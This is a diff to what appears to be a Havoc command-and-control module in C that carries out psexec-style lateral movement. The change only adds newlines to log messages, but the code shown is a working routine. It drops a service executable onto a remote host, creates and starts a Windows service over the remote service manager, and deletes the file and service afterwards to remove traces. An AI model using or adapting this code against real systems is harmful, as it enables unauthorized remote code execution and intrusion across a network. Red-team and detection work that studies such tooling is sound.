@@ -84,23 +84,23 @@ VOID go( PVOID Buffer, ULONG Length )
     SvcBinary = BeaconDataExtract( &Parser, &SvcBinarySize );
     SvcPath   = BeaconDataExtract( &Parser, NULL );
 
-    // BeaconPrintf( HAVOC_CONSOLE_GOOD, "Psexec [Host: %s] [SvcName: %s] [SvcPath: %s]", Host, SvcName, SvcPath );
+    BeaconPrintf( HAVOC_CONSOLE_GOOD, "Psexec [Host: %s] [SvcName: %s] [SvcPath: %s]\n", Host, SvcName, SvcPath );
 
     /* Upload service file to target machine (overwrite existing file)*/
     hFile = KERNEL32$CreateFileA( SvcPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
     if ( hFile == INVALID_HANDLE_VALUE )
     {
-        BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateFileA Failed: %d", KERNEL32$GetLastError() );
+        BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateFileA Failed: %d\n", KERNEL32$GetLastError() );
         goto EXIT;
     }
 
     if ( ! KERNEL32$WriteFile( hFile, SvcBinary, SvcBinarySize, &Written, NULL ) )
     {
-        BeaconPrintf( HAVOC_CONSOLE_ERRO, "WriteFile Failed: %d", KERNEL32$GetLastError() );
+        BeaconPrintf( HAVOC_CONSOLE_ERRO, "WriteFile Failed: %d\n", KERNEL32$GetLastError() );
         goto EXIT;
     }
 
-    BeaconPrintf( HAVOC_CONSOLE_INFO, "Dropped service executable on %s at %s", Host, SvcPath );
+    BeaconPrintf( HAVOC_CONSOLE_INFO, "Dropped service executable on %s at %s\n", Host, SvcPath );
 
     /* Close the file */
     KERNEL32$CloseHandle( hFile );
@@ -111,33 +111,33 @@ VOID go( PVOID Buffer, ULONG Length )
     hSvcManager = ADVAPI32$OpenSCManagerA( Host, NULL, SC_MANAGER_ALL_ACCESS );
   	if ( ! hSvcManager ) 
     {
-		BeaconPrintf( HAVOC_CONSOLE_ERRO, "OpenSCManagerA Failed: %d", KERNEL32$GetLastError() );
+		BeaconPrintf( HAVOC_CONSOLE_ERRO, "OpenSCManagerA Failed: %d\n", KERNEL32$GetLastError() );
 	    goto EXIT;
 	}
 
     hSvcService = ADVAPI32$CreateServiceA( hSvcManager, SvcName, NULL, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, SvcPath, NULL, NULL, NULL, NULL, NULL );
 	if ( ! hSvcService ) 
     {
-	    BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateServiceA Failed: %d", KERNEL32$GetLastError() );
+	    BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateServiceA Failed: %d\n", KERNEL32$GetLastError() );
         goto EXIT;
 	}
 
-    BeaconPrintf( HAVOC_CONSOLE_INFO, "Starting Service executable..." );
+    BeaconPrintf( HAVOC_CONSOLE_INFO, "Starting Service executable...\n" );
 
     // TODO: check if service is dead after starting it. maybe we trying to start a buggy one...
     // TODO: add check for ERROR_SERVICE_REQUEST_TIMEOUT
     if ( ! ADVAPI32$StartServiceA( hSvcService, 0, NULL ) ) 
     {
-	    BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateServiceA Failed: %d", KERNEL32$GetLastError() );
+	    BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateServiceA Failed: %d\n", KERNEL32$GetLastError() );
         goto EXIT;
 	}
 
-    BeaconPrintf( HAVOC_CONSOLE_INFO, "Successful started Service executable" );
+    BeaconPrintf( HAVOC_CONSOLE_INFO, "Successful started Service executable\n" );
 
     if ( ! KERNEL32$DeleteFileA( SvcPath ) )
-        BeaconPrintf( HAVOC_CONSOLE_ERRO, "Failed to delete service executable %s from %s Error:[%d]", SvcPath, Host, KERNEL32$GetLastError() );
+        BeaconPrintf( HAVOC_CONSOLE_ERRO, "Failed to delete service executable %s from %s Error:[%d]\n", SvcPath, Host, KERNEL32$GetLastError() );
     else
-        BeaconPrintf( HAVOC_CONSOLE_INFO, "Deleted service executable %s from %s", SvcPath, Host );
+        BeaconPrintf( HAVOC_CONSOLE_INFO, "Deleted service executable %s from %s\n", SvcPath, Host );
 
     Success = TRUE; 
 
@@ -149,7 +149,7 @@ EXIT:
     }
 
     if ( ! ADVAPI32$DeleteService( hSvcService ) ) 
-		BeaconPrintf( HAVOC_CONSOLE_ERRO, "Failed to delete Service %s on %s: %d", SvcName, Host, KERNEL32$GetLastError() );
+		BeaconPrintf( HAVOC_CONSOLE_ERRO, "Failed to delete Service %s on %s: %d\n", SvcName, Host, KERNEL32$GetLastError() );
 
     if ( hSvcService )
     {
@@ -164,7 +164,7 @@ EXIT:
     }
 
     if ( Success )
-        BeaconPrintf( HAVOC_CONSOLE_GOOD, "psexec successful executed on %s", Host );
+        BeaconPrintf( HAVOC_CONSOLE_GOOD, "psexec successful executed on %s\n", Host );
     else
-        BeaconPrintf( HAVOC_CONSOLE_ERRO, "psexec failed to execut on %s", Host );
+        BeaconPrintf( HAVOC_CONSOLE_ERRO, "psexec failed to execut on %s\n", Host );
 }
